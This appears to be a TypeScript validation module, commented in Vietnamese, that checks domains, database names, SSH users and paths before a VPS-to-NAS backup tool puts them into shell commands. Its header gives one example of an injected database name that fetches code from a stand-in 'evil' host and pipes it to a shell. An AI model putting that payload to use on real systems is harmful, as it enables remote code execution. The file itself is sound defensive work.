/**
 * Kiểm tra định danh lấy từ VPS (tên miền, user hệ thống, tên DB, webroot) hoặc từ API
 * trước khi đưa vào lệnh shell (root trên VPS / bash trên NAS) hay ghép đường dẫn trên NAS.
 *
 * Khách hàng hosting tự tạo được DB tên tùy ý trong prefix của họ, VD trên cPanel:
 *   CREATE DATABASE `cpuser_$(curl evil|sh)`
 * nên mọi giá trị này phải coi là KHÔNG tin cậy.
 */

// Nhãn tên miền chuẩn (bao gồm punycode xn--), không có "..", không bắt đầu bằng "-" hay "."
const DOMAIN_RE = /^[A-Za-z0-9](?:[A-Za-z0-9_-]*[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9_-]*[A-Za-z0-9])?)*$/;
// User Linux / panel: không bắt đầu bằng "-" (tránh bị hiểu là option của ssh/chown)
const SYSTEM_USER_RE = /^[A-Za-z_][A-Za-z0-9_.-]{0,63}$/;
// Tên DB MySQL thực tế trên các panel: chữ, số, "_" và "-"; không bắt đầu bằng "-"
const DB_NAME_RE = /^[A-Za-z0-9_][A-Za-z0-9_-]{0,63}$/;
// IPv4 / IPv6 / hostname
const HOST_ADDRESS_RE = /^(?:[A-Za-z0-9](?:[A-Za-z0-9.-]*[A-Za-z0-9])?|[0-9A-Fa-f:]+)$/;
// Đường dẫn tuyệt đối POSIX, chỉ ký tự an toàn, không có segment "." / ".."
const POSIX_PATH_RE = /^\/[A-Za-z0-9._@+\/-]*$/;

export function isSafeDomain(value: string): boolean {
  return value.length <= 253 && DOMAIN_RE.test(value);
}

export function isSafeSystemUser(value: string): boolean {
  return SYSTEM_USER_RE.test(value);
}

export function isSafeDbName(value: string): boolean {
  return DB_NAME_RE.test(value);
}

export function isSafeHostAddress(value: string): boolean {
  return value.length <= 253 && HOST_ADDRESS_RE.test(value);
}

export function isSafeWebroot(value: string, minSegments = 3): boolean {
  if (!POSIX_PATH_RE.test(value)) return false;
  const segments = value.split('/').filter(Boolean);
  if (segments.some((s) => s === '.' || s === '..')) return false;
  // Chặn "/", "/home", "/home/user"... để rsync --delete / chown -R không quét cả hệ thống
  return segments.length >= minSegments;
}

/**
 * hostname được dùng làm tên thư mục snapshot trên NAS (path.join(mount, hostname, ...)),
 * nên chỉ cần chặn ký tự tách đường dẫn / "..". Cho phép tên hiển thị tự do (VD: "VPS Khách A").
 */
export function isSafeServerLabel(value: string): boolean {
  return (
    value.length > 0 &&
    value.length <= 128 &&
    !/[/\\\x00-\x1f]/.test(value) &&
    !value.startsWith('.') &&
    !value.includes('..')
  );
}

/** Trả về thông báo lỗi tiếng Việt nếu trường kết nối máy chủ không hợp lệ, hoặc null. */
export function validateServerConnectionFields(fields: {
  hostname: string;
  ipAddress: string;
  sshUser: string;
}): string | null {
  if (!isSafeServerLabel(fields.hostname)) {
    return 'Hostname không được chứa "/", "\\", ".." hoặc bắt đầu bằng dấu chấm.';
  }
  if (!isSafeHostAddress(fields.ipAddress)) {
    return 'Địa chỉ IP / Hostname SSH không hợp lệ (chỉ gồm chữ, số, ".", "-", ":").';
  }
  if (!isSafeSystemUser(fields.sshUser)) {
    return 'SSH User không hợp lệ (chỉ gồm chữ, số, "_", ".", "-" và không bắt đầu bằng "-").';
  }
  return null;
}

export function assertSafe(
  check: (v: string) => boolean,
  value: string,
  label: string
): string {
  if (!check(value)) {
    throw new Error(`${label} không hợp lệ hoặc chứa ký tự nguy hiểm: ${JSON.stringify(value)}`);
  }
  return value;
}
